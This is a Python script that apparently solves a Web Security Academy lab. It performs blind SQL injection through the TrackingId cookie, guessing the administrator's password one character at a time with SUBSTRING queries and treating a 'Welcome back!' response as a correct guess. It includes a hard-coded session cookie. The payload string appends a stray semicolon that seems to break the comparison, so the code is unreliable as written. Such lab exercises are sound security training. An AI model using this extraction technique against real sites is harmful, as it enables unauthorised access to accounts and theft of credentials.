import requests

# Target URL and headers
base_url = "https://0a39003604b82305815b936500d600a1.web-security-academy.net"
endpoint = "/filter?category="
full_url = base_url + endpoint
cookie = {
    "TrackingId": "",
    "session": "7QR0bfOXbSe9iJLAW4L6uc8vNjGvDJJG"
}

# Characters to test for password
possible_characters = "abcdefghijklmnopqrstuvwxyz0123456789"

# Function to test a specific character position
def test_password_char(position, char):
    # SQL injection query
    payload = f"sCfdRKfKGIYU7YGh' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {position}, 1) = '{char};"

    # Update the TrackingId in the cookie with the payload
    cookie['TrackingId'] = payload

    # Send GET request
    response = requests.get(full_url, cookies=cookie)

    # Check if the response contains "Welcome back!" indicating a correct guess
    if "Welcome back!" in response.text:
        return True
    return False

# Function to extract the password
def extract_password():
    password = ""
    position = 1

    # Loop until we stop finding characters
    while True:
        found_char = False
        for char in possible_characters:
            if test_password_char(position, char):
                password += char
                print(f"Found character: {char} at position {position}")
                found_char = True
                break

        # If no character was found, we can assume the password is complete
        if not found_char:
            break
        position += 1

    return password

# Start extracting the password
password = extract_password()
print(f"The administrator's password is: {password}")
